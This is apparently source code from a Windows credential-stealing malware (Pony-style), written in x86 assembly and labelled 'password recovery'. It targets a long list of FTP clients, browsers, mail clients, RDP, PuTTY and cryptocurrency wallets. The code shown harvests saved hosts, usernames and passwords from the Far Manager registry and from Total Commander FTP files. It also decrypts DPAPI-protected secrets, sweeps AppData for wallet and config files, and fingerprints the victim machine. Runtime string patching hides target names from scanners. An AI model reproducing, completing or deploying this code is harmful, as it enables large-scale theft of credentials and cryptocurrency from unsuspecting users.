; Password recovery modules

.data
	szFilePoint				db	'.',0
	szFilePPoint			db	'..',0
	CCommonFileMask			db	'\*.*',0
	CCommonFileMaskNoSlash	db	'*.*',0	

.code

ITEMHDR_ID					equ 0beef0000h

MODULE_SYSTEMINFO			equ 00000000h

MODULE_FAR					equ 00000001h
MODULE_WTC					equ 00000002h
MODULE_WS_FTP 				equ 00000003h
MODULE_CUTEFTP				equ 00000004h
MODULE_FLASHFXP				equ 00000005h
MODULE_FILEZILLA			equ 00000006h
MODULE_FTPCOMMANDER			equ 00000007h
MODULE_BULLETPROOF			equ 00000008h
MODULE_SMARTFTP				equ 00000009h
MODULE_TURBOFTP				equ 0000000ah
MODULE_FFFTP				equ 0000000bh
MODULE_COFFEECUPFTP			equ 0000000ch
MODULE_COREFTP				equ 0000000dh
MODULE_FTPEXPLORER			equ 0000000eh
MODULE_FRIGATEFTP			equ 0000000fh
MODULE_SECUREFX				equ 00000010h
MODULE_ULTRAFXP				equ 00000011h
MODULE_FTPRUSH				equ 00000012h
MODULE_WEBSITEPUBLISHER		equ 00000013h
MODULE_BITKINEX				equ 00000014h
MODULE_EXPANDRIVE			equ 00000015h
MODULE_CLASSICFTP			equ 00000016h
MODULE_FLING				equ 00000017h
MODULE_SOFTX				equ 00000018h
MODULE_DIRECTORYOPUS		equ 00000019h
MODULE_FREEFTP				equ 0000001ah
MODULE_LEAPFTP				equ 0000001bh
MODULE_WINSCP				equ 0000001ch
MODULE_32BITFTP				equ 0000001dh
MODULE_NETDRIVE				equ 0000001eh
MODULE_WEBDRIVE				equ 0000001fh
MODULE_FTPCONTROL			equ 00000020h
MODULE_OPERA				equ 00000021h
MODULE_WISEFTP				equ 00000022h
MODULE_FTPVOYAGER			equ 00000023h
MODULE_FIREFOX				equ 00000024h
MODULE_FIREFTP				equ 00000025h
MODULE_SEAMONKEY			equ 00000026h
MODULE_FLOCK				equ 00000027h
MODULE_MOZILLA				equ 00000028h
MODULE_LEECHFTP				equ 00000029h
MODULE_ODIN					equ 0000002ah
MODULE_WINFTP				equ 0000002bh
MODULE_FTP_SURFER			equ 0000002ch
MODULE_FTPGETTER			equ 0000002dh
MODULE_ALFTP				equ 0000002eh
MODULE_IE					equ 0000002fh
MODULE_DREAMWEAVER			equ 00000030h
MODULE_DELUXEFTP			equ 00000031h
MODULE_CHROME				equ 00000032h
MODULE_CHROMIUM				equ 00000033h
MODULE_CHROMEPLUS			equ 00000034h
MODULE_BROMIUM				equ 00000035h
MODULE_NICHROME				equ 00000036h
MODULE_COMODODRAGON			equ 00000037h
MODULE_ROCKMELT				equ 00000038h
MODULE_KMELEON				equ 00000039h
MODULE_EPIC					equ 0000003ah
MODULE_STAFF				equ 0000003bh
MODULE_ACEFTP				equ 0000003ch
MODULE_GLOBALDOWNLOADER		equ 0000003dh
MODULE_FRESHFTP				equ 0000003eh
MODULE_BLAZEFTP				equ 0000003fh
MODULE_NETFILE				equ 00000040h
MODULE_GOFTP				equ 00000041h
MODULE_3DFTP				equ 00000042h
MODULE_EASYFTP				equ 00000043h
MODULE_XFTP					equ 00000044h
MODULE_RDP					equ 00000045h
MODULE_FTPNOW				equ 00000046h
MODULE_ROBOFTP				equ 00000047h
MODULE_CERT					equ 00000048h
MODULE_LINASFTP				equ 00000049h
MODULE_CYBERDUCK			equ 0000004ah
MODULE_PUTTY				equ 0000004bh
MODULE_NOTEPADPP			equ 0000004ch
MODULE_VS_DESIGNER			equ 0000004dh
MODULE_FTPSHELL				equ 0000004eh
MODULE_FTPINFO				equ 0000004fh
MODULE_NEXUSFILE			equ 00000050h
MODULE_FS_BROWSER			equ	00000051h
MODULE_COOLNOVO				equ	00000052h
MODULE_WINZIP				equ	00000053h
MODULE_YANDEXINTERNET		equ	00000054h
MODULE_MYFTP				equ	00000055h
MODULE_SHERRODFTP			equ	00000056h
MODULE_NOVAFTP				equ	00000057h
MODULE_WINDOWS_MAIL			equ	00000058h
MODULE_WINDOWS_LIVE_MAIL	equ	00000059h
MODULE_BECKY				equ	0000005ah
MODULE_POCOMAIL				equ 0000005bh
MODULE_INCREDIMAIL			equ 0000005ch
MODULE_THEBAT				equ 0000005dh
MODULE_OUTLOOK				equ 0000005eh
MODULE_THUNDERBIRD			equ 0000005fh
MODULE_FASTTRACK			equ 00000060h
MODULE_BITCOIN				equ 00000061h
MODULE_ELECTRUM				equ 00000062h
MODULE_MULTIBIT				equ 00000063h
MODULE_FTPDISK				equ	00000064h
MODULE_LITECOIN				equ	00000065h
MODULE_NAMECOIN				equ	00000066h
MODULE_TERRACOIN			equ 00000067h
MODULE_BITCOINARMORY		equ 00000068h
MODULE_PPCOIN				equ 00000069h
MODULE_PRIMECOIN			equ 0000006ah
MODULE_FEATHERCOIN			equ 0000006bh
MODULE_NOVACOIN				equ 0000006ch
MODULE_FREICOIN				equ 0000006dh
MODULE_DEVCOIN				equ 0000006eh
MODULE_FRANKOCOIN			equ 0000006fh
MODULE_PROTOSHARES			equ 00000070h
MODULE_MEGACOIN				equ 00000071h
MODULE_QUARKCOIN			equ 00000072h
MODULE_WORLDCOIN			equ 00000073h
MODULE_INFINITECOIN			equ 00000074h
MODULE_IXCOIN				equ 00000075h
MODULE_ANONCOIN				equ 00000076h
MODULE_BBQCOIN				equ 00000077h
MODULE_DIGITALCOIN			equ 00000078h
MODULE_MINCOIN				equ 00000079h
MODULE_GOLDCOIN				equ 0000007ah
MODULE_YACOIN				equ 0000007bh
MODULE_ZETACOIN				equ 0000007ch
MODULE_FASTCOIN				equ 0000007dh
MODULE_I0COIN				equ 0000007eh
MODULE_TAGCOIN				equ 0000007fh
MODULE_BYTECOIN				equ 00000080h
MODULE_FLORINCOIN			equ 00000081h
MODULE_PHOENIXCOIN			equ 00000082h
MODULE_LUCKYCOIN			equ 00000083h
MODULE_CRAFTCOIN			equ 00000084h
MODULE_JUNKCOIN				equ 00000085h

.code

CREDENTIAL struct DWORD
	dwFlags				dd	?
	dwType				dd	?
	TargetName			dd	?
	_Comment			dd	?
	LastWritten			FILETIME <>
	CredentialBlobSize	dd	?
	CredentialBlob		dd	?
	Persist				dd	?
	AttributeCount		dd	?
	Attributes			dd	?
	TargetAlias			dd	?
	UserName			dd	?
CREDENTIAL ends

; Write data into IStream
CommonAppendData proc stream, data, datalen, dwType
	.IF	stream && datalen
		invoke	StreamWriteDWORD, stream, dwType
		invoke	StreamWriteBinaryString, stream, data, datalen
	.ENDIF
	ret
CommonAppendData endp

; Write null-terminated string into IStream
CommonAppendDataStr proc stream, data, dwType
	.IF	stream && data
		invoke	StreamWriteDWORD, stream, dwType
		invoke	StreamWriteString, stream, data
	.ENDIF
	ret
CommonAppendDataStr endp

; Write binary file contents into IStream
; duplicate files are ignored
CommonAppendFile proc stream, path, dwType
	LOCAL	map: MappedFile
		
	invoke	ExpandEnvStr, path
	mov	path, eax
	.IF	path
		invoke	FileExists, path
		.IF	eax
			invoke	MapFile, path, addr map
			.IF	eax
				.IF	map.dwFileSize < MEM_LIMIT
					invoke	IsDataAlreadyProcessed, map.lpMem, map.dwFileSize
					.IF	!eax
						invoke	CommonAppendData, stream, map.lpMem, map.dwFileSize, dwType
					.ENDIF					
				.ENDIF
				invoke	UnmapFile, addr map
			.ENDIF
		.ENDIF
		invoke	MemFree, path
	.ENDIF
	ret
CommonAppendFile endp

; Write binary file contents into IStream
; duplicate files are written too
CommonAppendFileForceDupe proc stream, path, dwType
	LOCAL	map: MappedFile
		
	invoke	ExpandEnvStr, path
	mov	path, eax
	.IF	path
		invoke	FileExists, path
		.IF	eax
			invoke	MapFile, path, addr map
			.IF	eax
				.IF	map.dwFileSize < MEM_LIMIT
					invoke	CommonAppendData, stream, map.lpMem, map.dwFileSize, dwType
				.ENDIF
				invoke	UnmapFile, addr map
			.ENDIF
		.ENDIF
		invoke	MemFree, path
	.ENDIF
	ret
CommonAppendFileForceDupe endp

; Check if certain file is a duplicate (was processed before)
IsFileAlreadyProcessed proc uses ebx path
	LOCAL	map: MappedFile
		
	sub	ebx, ebx
	
	invoke	ExpandEnvStr, path
	mov	path, eax
	.IF	path
		invoke	FileExists, path
		.IF	eax
			invoke	MapFile, path, addr map
			.IF	eax
				.IF	map.dwFileSize < MEM_LIMIT
					invoke	IsDataAlreadyProcessed, map.lpMem, map.dwFileSize
					.IF	eax
						inc	ebx
					.ENDIF					
				.ENDIF
				invoke	UnmapFile, addr map
			.ENDIF
		.ENDIF
		invoke	MemFree, path
	.ENDIF
	
	mov	eax, ebx
	ret
IsFileAlreadyProcessed endp

; Recursively search files in a folder and all sub folder using filter (filemask)
CommonFileScanCallback proc stream, dir, filemask, item_id, callback
	LOCAL	FindFileData: WIN32_FIND_DATA
	LOCAL	hFind: DWORD
	LOCAL	path: DWORD
	LOCAL	ininame: DWORD
	
	mov	path, 0

	; Do not process empty directories	
	mov	eax, dir
	.IF	(!eax) || (!byte ptr[eax])
		jmp	@not_found
	.ENDIF
	
	invoke	CheckEndSlash, dir
	.IF	!eax
		invoke	PonyStrCat, dir, offset CCommonFileMask
	.ELSE
		invoke	PonyStrCat, dir, offset CCommonFileMaskNoSlash
	.ENDIF
	mov	path, eax
	
	invoke	ZeroMemory, addr FindFileData, sizeof WIN32_FIND_DATA

        invoke  FindFirstFile, path, addr FindFileData
        mov     hFind, eax
        inc     eax
        jz      @not_found

@find_loop:
        lea	edx, FindFileData
        test    [edx].WIN32_FIND_DATA.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
        .IF	!ZERO?
        	; is directory, scan recursively
        	
        	; skip "." and ".." path names
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	lea	edx, FindFileData
        	lea	eax, [edx].WIN32_FIND_DATA.cFileName
        	invoke	lstrcmpi, offset szFilePPoint, eax
        	.IF	!eax
        		jmp	@skip
        	.ENDIF
        	
        	invoke	CheckEndSlash, dir
        	.IF	!eax
			invoke	PonyStrCat, dir, offset szSlash
		.ELSE
			invoke	PonyStrCat, dir, NULL
		.ENDIF
        	lea	edx, FindFileData
		lea	edx, [edx].WIN32_FIND_DATA.cFileName		
		invoke	PonyStrCatFreeArg1, eax, edx
		push	eax
		invoke	CommonFileScanCallback, stream, eax, filemask, item_id, callback
		call	MemFree
        	
        	jmp	@skip
        .ENDIF

	lea	eax, [edx].WIN32_FIND_DATA.cFileName
	mov	ininame, eax
	
	.IF	!filemask
		jmp	@process_all_files
	.ENDIF
	invoke	StrStrI, ininame, filemask
	.IF	eax
		@process_all_files:
		invoke	PonyStrCat, dir, offset szSlash
		invoke	PonyStrCatFreeArg1, eax, ininame
		push	eax
		.IF	callback
			push	item_id
			push	eax
			push	stream
			call	callback
		.ELSE
			invoke	CommonAppendFile, stream, eax, item_id
		.ENDIF
		call	MemFree		
	.ENDIF

@skip:
        invoke  FindNextFile, hFind, addr FindFileData
       	test    eax, eax
       	jnz     @find_loop
       	
	invoke	FindClose, hFind
	
@not_found:
	invoke	MemFree, path

	ret
CommonFileScanCallback endp

CommonFileScan proc stream, dir, filemask, item_id
	invoke	CommonFileScanCallback, stream, dir, filemask, item_id, NULL
	ret
CommonFileScan endp

; Recursively search for files according to the mask (config_file) inside CSIDL shell folder
AppDataCommonSingleFileScan proc stream, csidl, appdata_dir, config_file, item_id
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, appdata_dir
		push	eax
		invoke	CommonFileScan, stream, eax, config_file, item_id
		call	MemFree
	.ENDIF
	ret
AppDataCommonSingleFileScan endp

; Recursively search for files according to the mask (config_file) inside common %APPDATA% shell folders
AppDataCommonFileScan proc stream, appdata_dir, config_file, item_id
	invoke	AppDataCommonSingleFileScan, stream, CSIDL_APPDATA, appdata_dir, config_file, item_id
	invoke	AppDataCommonSingleFileScan, stream, CSIDL_COMMON_APPDATA, appdata_dir, config_file, item_id
	invoke	AppDataCommonSingleFileScan, stream, CSIDL_LOCAL_APPDATA, appdata_dir, config_file, item_id
	ret
AppDataCommonFileScan endp

CommonCryptUnprotectData proc uses ebx esi edi szPassword, lpdwPasswordLen, pbEntropyBlob
	LOCAL	InBlob: DATA_BLOB
	LOCAL	OutBlob: DATA_BLOB
	
	sub	ebx, ebx
	
	mov	eax, lpdwPasswordLen
	m2m	InBlob.cbData, dword ptr [eax] 
	m2m	InBlob.pbData, szPassword
	mov	OutBlob.pbData, 0
	
	.IF	MyCryptUnprotectData && szPassword
		lea	eax, OutBlob
		push	eax
		push	CRYPTPROTECT_UI_FORBIDDEN
		push	0
		push	0
		.IF	pbEntropyBlob
			push	pbEntropyBlob
		.ELSE
			push	0
		.ENDIF
		push	0
		lea	eax, InBlob
		push	eax
		call	MyCryptUnprotectData
		.IF	eax && OutBlob.pbData
			mov	eax, lpdwPasswordLen
			mov	ecx, OutBlob.cbData
			
			; check if the input buffer is large enough to hold the decrypted password
			.IF	ecx <= dword ptr[eax]
				inc	ebx ; report decryption success
				
				cld
				mov	esi, OutBlob.pbData
				mov	edi, szPassword
				mov	ecx, OutBlob.cbData
				jecxz	@F
				rep movsb
			@@:				
				mov	eax, lpdwPasswordLen
				m2m	dword ptr[eax], OutBlob.cbData
			.ENDIF
			invoke	LocalFree, OutBlob.pbData
		.ENDIF
	.ENDIF
	
	mov	eax, ebx
	ret
CommonCryptUnprotectData endp

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Common System Information

IFNDEF SKIP_SYSTEM_INFO

.data
	szHWIDValue		db	"HWID",0
	szGUIDFmt		db	"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",0

	win64_getnative		db	"GetNativeSystemInfo",0
	win64_kernel		db	"kernel32.dll",0
	win64_process		db	"IsWow64Process",0

.code

IsWin64 proc uses ebx esi edi
	LOCAL	W: DWORD

	invoke	GetModuleHandle, offset win64_kernel
	mov	ebx, eax

	mov	W, FALSE

	.IF	eax
		invoke	GetProcAddress, ebx, offset win64_getnative
		.IF	eax
			mov	esi, eax

			invoke	GetProcAddress, ebx, offset win64_process
			.IF	eax
				mov	edi, eax
				lea	eax, W
				push	eax
				invoke	GetCurrentProcess
				push	eax
				
				call	edi

				.IF	W
					mov	eax, TRUE
					ret
				.ENDIF
			.ENDIF
		.ENDIF
	.ENDIF

	mov	eax, FALSE
	ret
IsWin64 endp

IsAdmin proc
	LOCAL	NtAuthority: SID_IDENTIFIER_AUTHORITY
	LOCAL	AdministratorsGroup: DWORD
	LOCAL	IsInAdminGroup: DWORD
	
	.IF	!MyAllocateAndInitializeSid || !MyCheckTokenMembership || !MyFreeSid
		mov	eax, TRUE
		ret
	.ENDIF

	lea	eax, NtAuthority
	mov	byte ptr[eax+0], 0
	mov	byte ptr[eax+1], 0
	mov	byte ptr[eax+2], 0
	mov	byte ptr[eax+3], 0
	mov	byte ptr[eax+4], 0
	mov	byte ptr[eax+5], 5
	
	lea		eax, AdministratorsGroup
	push	eax
	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	push	DOMAIN_ALIAS_RID_ADMINS
	push	SECURITY_BUILTIN_DOMAIN_RID
	push	2
	lea	eax, NtAuthority
	push	eax
	call	MyAllocateAndInitializeSid
	.IF	!eax
		ret
	.ENDIF
	
	mov	IsInAdminGroup, FALSE
	
	lea	eax, IsInAdminGroup
	push	eax
	push	AdministratorsGroup
	push	NULL
	call	MyCheckTokenMembership
	.IF	!eax
		mov	IsInAdminGroup, FALSE
	.ENDIF
	
	push	AdministratorsGroup
	call	MyFreeSid
	
	mov	eax, IsInAdminGroup
	ret
IsAdmin endp

InstallHWIDValue proc
	LOCAL	guid: GUID
	LOCAL	guid_str[100]: BYTE
	LOCAL	out_len: DWORD

	invoke	ReadAppOptionValue, offset szHWIDValue, addr out_len
	
	push	eax
	.IF	!eax || out_len <= 20
		invoke	CoCreateGuid, addr guid
		test	eax, eax
		.IF	SUCCEEDED
			movzx	eax, guid.Data4[7]
			push	eax
			movzx	eax, guid.Data4[6]
			push	eax
			movzx	eax, guid.Data4[5]
			push	eax
			movzx	eax, guid.Data4[4]
			push	eax
			movzx	eax, guid.Data4[3]
			push	eax
			movzx	eax, guid.Data4[2]
			push	eax
			movzx	eax, guid.Data4[1]
			push	eax
			movzx	eax, guid.Data4[0]
			push	eax
			movzx	eax, guid.Data3
			push	eax
			movzx	eax, guid.Data2
			push	eax
			push	guid.Data1
			push	offset szGUIDFmt
			lea	eax, guid_str
			push	eax
			call	wsprintf
			add	esp, 34h

			invoke	lstrlen, addr guid_str
			invoke	WriteAppOptionValue, offset szHWIDValue, addr guid_str, eax
		.ENDIF
	.ENDIF
	call	MemFree
	ret
InstallHWIDValue endp

GrabSystemInfo proc uses ebx edi stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	vi: OSVERSIONINFOEX
	LOCAL	locale_str: DWORD
	LOCAL	out_len: DWORD
	LOCAL	guid_str: DWORD
	LOCAL	lpSystemInfo: SYSTEM_INFO
	LOCAL	hKernel: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_SYSTEMINFO, 0
	mov	hdr_ofs, eax
	
	invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
	
	invoke	ZeroMemory, addr vi, sizeof OSVERSIONINFOEX 
	mov	vi.dwOSVersionInfoSize, sizeof OSVERSIONINFOEX 
	invoke	GetVersionEx, addr vi
	
	; Zero non-used bytes in vi.szCSDVersion array
	sub	ecx, ecx
	sub	edx, edx
	lea	edi, vi.szCSDVersion
	
	.WHILE	ecx < 128
		.IF	byte ptr[edi] == 0
			mov	edx, 1
		.ENDIF
		.IF	edx
			mov	byte ptr[edi], 0
		.ENDIF
		inc	edi
		inc	ecx
	.ENDW
	
	; OS version
	.IF	eax
		invoke	StreamWriteBinaryString, stream, addr vi, sizeof OSVERSIONINFOEX
	.ELSE
		invoke	StreamWriteBinaryString, stream, NULL, 0
	.ENDIF
	
	; 64-bit check
	invoke	IsWin64
	invoke	StreamWriteDWORD, stream, eax
	 
	invoke	MemAlloc, 1024
	mov	locale_str, eax
	
	; User country
	invoke	GetLocaleInfo, LOCALE_USER_DEFAULT, LOCALE_SENGCOUNTRY, locale_str, 1023
	invoke	StreamWriteBinaryString, stream, locale_str, eax
	
	; User language
	invoke	GetLocaleInfo, LOCALE_USER_DEFAULT, LOCALE_SENGLANGUAGE, locale_str, 1023
	invoke	StreamWriteBinaryString, stream, locale_str, eax

	; Check for admin rights	
	invoke	IsAdmin
	invoke	StreamWriteDWORD, stream, eax
	
	; Unique computer HWID
	invoke	InstallHWIDValue
	invoke	ReadAppOptionValue, offset szHWIDValue, addr out_len
	mov	guid_str, eax
	.IF	guid_str && out_len >= 20
		add	out_len, 4
		invoke	StreamWriteDWORD, stream, out_len
		sub	out_len, 4
		invoke	StreamWriteDWORD, stream, 0ffffffffh
		invoke	StreamWriteData, stream, guid_str, out_len
	.ELSE
		invoke	StreamWriteBinaryString, stream, NULL, 0
	.ENDIF
	
	invoke	MemFree, guid_str	
	invoke	MemFree, locale_str
	
	sub	ebx, ebx
	invoke	GetModuleHandle, offset win64_kernel
	mov	hKernel, eax
	.IF	hKernel
		invoke	GetProcAddress, hKernel, offset win64_getnative
		.IF	eax
			lea	edx, lpSystemInfo
			push	edx
			call	eax
			inc	ebx
		.ENDIF
	.ENDIF

	.IF	!ebx
		invoke	GetSystemInfo, addr lpSystemInfo
	.ENDIF

	invoke	StreamWriteBinaryString, stream, addr lpSystemInfo, sizeof lpSystemInfo

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	
	ret
GrabSystemInfo endp

ELSE

GrabSystemInfo proc stream
	sub	eax, eax
	ret
GrabSystemInfo endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FAR/FAR2/FAR3 built-in ftp client
; http://www.farmanager.com/
; Tested: FAR 2.0 build 1807 x86
; Tested: Far Manager v3.0 build 2673 x86
; Tested: Far Manager v3.0 build 3367 x86
; Tested: Far Manager v3.0 build 3525 x86
; SFTP: implemented (WinSCP plugin)

IFDEF COMPILE_MODULE_FAR

.data

CFarBasePath1	db "Software\Far\Plugins\FTP\Hosts",0
CFarBasePath2	db "Software\Far2\Plugins\FTP\Hosts",0
CFarBasePath3	db "Software\Far Manager\Plugins\FTP\Hosts",0
CFarHistPath1	db "Software\Far\SavedDialogHistory\FTPHost",0
CFarHistPath2	db "Software\Far2\SavedDialogHistory\FTPHost",0
CFarHistPath3	db "Software\Far Manager\SavedDialogHistory\FTPHost",0
CFarPassword	db "Password",0
CFarHost	db "HostName",0
CFarUser	db "User",0
CFarLine	db "Line",0

.code

FarScanHistory proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	ftp: DWORD
	LOCAL	dwType: DWORD
	LOCAL	dwLen: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumValue, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, addr dwType, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			.IF	(dwType != REG_SZ) && (dwType != REG_MULTI_SZ)
				inc	KeyIndex
				.CONTINUE
			.ENDIF
			invoke	StrStrI, addr lpBuf, addr CFarLine
			.IF	eax
				invoke	RegReadValueStr, dwCurrentUserKey, BasePath, addr lpBuf, addr dwLen
				.IF	eax
					mov	ftp, eax
					; export data, type = 0001: FTP URI
					invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
					.IF	dwType == REG_SZ
						invoke	StreamWriteDWORD, stream, 0
					.ELSE
						invoke	StreamWriteDWORD, stream, 1
					.ENDIF
					invoke	StreamWriteBinaryString, stream, ftp, dwLen
					invoke	MemFree, ftp
				.ENDIF
			.ENDIF
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
FarScanHistory endp

FarScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFarPassword, NULL
			mov	Password, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFarHost, NULL
			mov	Host, eax 
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CFarUser, NULL
			mov	User, eax 
			
			.IF	Password && Host && User
				; export data, type = 0000: Host | User | Pass
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
			.ENDIF
			
			invoke	MemFree, Password
			invoke	MemFree, Host
			invoke	MemFree, User
			
			; recursively scan sub-paths
			invoke	FarScanReg, stream, S			
			invoke	MemFree, S
			
			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
FarScanReg endp

GrabFarManager proc stream
	LOCAL	hdr_ofs: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_FAR, 0
	mov	hdr_ofs, eax
	
	; FAR 1.x
	invoke	FarScanReg, stream, addr CFarBasePath1
	; FAR 2.x
	invoke	FarScanReg, stream, addr CFarBasePath2
	; FAR 3.x
	invoke	FarScanReg, stream, addr CFarBasePath3
	
	; History FAR 1.x
	invoke	FarScanHistory, stream, addr CFarHistPath1
	; History FAR 2.x
	invoke	FarScanHistory, stream, addr CFarHistPath2
	; History FAR 3.x
	invoke	FarScanHistory, stream, addr CFarHistPath3

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFarManager endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Windows/Total Commander built-in ftp client
; http://www.ghisler.com/
; Tested: 7.56a
; Tested: 8.0B9
; Tested: 8.0B12 x64
; Tested: 8.0 64 bit (Release)
; Tested: 8.01 64 bit (Release)
; SFTP: not supported

IFDEF COMPILE_MODULE_WTC

.data

	CWTCIni			db '_cx_ftp.ini',0
	CWTCIniAppData	db '\GHISLER',0
	
	CWTCRegValue1	db 'InstallDir',0
	CWTCRegValue2	db 'FtpIniName',0

	CWTCRegPath1 	db 'Software\_hisler\Windows Commander',0
	CWTCRegPath2 	db 'Software\_hisler\Total Commander',0
	
.code

WTCProcessFile proc stream, path
	invoke	CommonAppendFile, stream, path, ITEMHDR_ID
	ret
WTCProcessFile endp

WTCCommonProcessDir proc stream, dir
	.IF	dir
		invoke	CheckEndSlash, dir
		.IF	!eax
			invoke	PonyStrCatFreeArg1, dir, offset szSlash
			mov	dir, eax
		.ENDIF

		; Extra ini name
		invoke	RegReadValueStr, dwCurrentUserKey, addr CWTCRegPath1, addr CWTCRegValue2, NULL
		.IF	eax
			push	eax
			invoke	PonyStrCat, dir, eax
			push	eax
			invoke	WTCProcessFile, stream, eax
			call	MemFree
			call	MemFree
		.ENDIF

		invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, addr CWTCRegPath1, addr CWTCRegValue2, NULL
		.IF	eax
			push	eax
			invoke	PonyStrCat, dir, eax
			push	eax
			invoke	WTCProcessFile, stream, eax
			call	MemFree
			call	MemFree
		.ENDIF

		invoke	RegReadValueStr, dwCurrentUserKey, addr CWTCRegPath2, addr CWTCRegValue2, NULL
		.IF	eax
			push	eax
			invoke	PonyStrCat, dir, eax
			push	eax
			invoke	WTCProcessFile, stream, eax
			call	MemFree
			call	MemFree
		.ENDIF

		invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, addr CWTCRegPath2, addr CWTCRegValue2, NULL
		.IF	eax
			push	eax
			invoke	PonyStrCat, dir, eax
			push	eax
			invoke	WTCProcessFile, stream, eax
			call	MemFree
			call	MemFree
		.ENDIF

		invoke	PonyStrCat, dir, offset CWTCIni
		push	eax
		invoke	WTCProcessFile, stream, eax
		call	MemFree

		invoke	MemFree, dir
	.ENDIF
	ret
WTCCommonProcessDir endp

GrabWTC proc stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	dir: DWORD
	LOCAL	path: DWORD
	
	invoke	StreamWriteModuleHeader, stream, MODULE_WTC, 0
	mov	hdr_ofs, eax

	mov byte ptr[CWTCIni], 'w'
	mov	byte ptr[CWTCRegPath1+9], 'G'
	mov	byte ptr[CWTCRegPath2+9], 'G'
	
	; Windows directory
	invoke	MemAlloc, MAX_PATH+1
	mov	dir, eax	
	invoke	GetWindowsDirectory, dir, MAX_PATH
	.IF	eax && eax <= MAX_PATH
		invoke	WTCCommonProcessDir, stream, dir
	.ELSE
		invoke	MemFree, dir
	.ENDIF	
	
	; Profile folder
	invoke	SHGetFolderPathStr, CSIDL_PROFILE
	invoke	WTCCommonProcessDir, stream, eax

	; AppData folder	
	invoke	SHGetFolderPathStr, CSIDL_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CWTCIniAppData
		invoke	WTCCommonProcessDir, stream, eax
	.ENDIF

	; Common AppData folder	
	invoke	SHGetFolderPathStr, CSIDL_COMMON_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CWTCIniAppData
		invoke	WTCCommonProcessDir, stream, eax
	.ENDIF

	; Local AppData folder	
	invoke	SHGetFolderPathStr, CSIDL_LOCAL_APPDATA
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CWTCIniAppData
		invoke	WTCCommonProcessDir, stream, eax
	.ENDIF
		
	; Registry paths
	invoke	RegReadValueStr, dwCurrentUserKey, addr CWTCRegPath1, addr CWTCRegValue1, NULL
	invoke	WTCCommonProcessDir, stream, eax
	
	invoke	RegReadValueStr, dwCurrentUserKey, addr CWTCRegPath1, addr CWTCRegValue2, NULL
	.IF	eax
		mov	path, eax
		invoke	WTCProcessFile, stream, path
		invoke	MemFree, path
	.ENDIF

	invoke	RegReadValueStr, dwCurrentUserKey, addr CWTCRegPath2, addr CWTCRegValue1, NULL
	invoke	WTCCommonProcessDir, stream, eax
	
	invoke	RegReadValueStr, dwCurrentUserKey, addr CWTCRegPath2, addr CWTCRegValue2, NULL
	.IF	eax
		mov	path, eax
		invoke	WTCProcessFile, stream, path
		invoke	MemFree, path
	.ENDIF

	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, addr CWTCRegPath1, addr CWTCRegValue1, NULL
	invoke	WTCCommonProcessDir, stream, eax
	
